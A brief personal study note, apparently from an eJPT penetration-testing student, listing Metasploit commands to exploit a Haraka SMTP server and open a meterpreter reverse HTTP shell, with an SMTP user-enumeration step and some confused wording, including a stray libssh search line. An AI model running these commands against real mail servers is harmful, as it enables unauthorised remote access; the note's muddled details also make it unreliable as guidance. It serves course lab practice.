eJPT uses for SMTP (mail server transfer protocol) the haraka tech.

To exploit it requires the following steps:

search libssh_auth_bypass
use exploit/linux/smtp/haraka
show options
set SRVPORT 9898
set email_to <valid email>
set payload linux/x64/meterpreter_reverse_http (non staged payload)
set LHOST <your ip>
set LPORT 8080
exploit

The course is fucking horrible in this regard, again they just give you random commands and no explanation.

The email needs to be failed or the exploit will fail, for this you need to do some recon with metasploit

-use auxiliary/scanner/smtp/smtp_enum

The port i got no clue why this in specific but using the same in eJPT is the way to go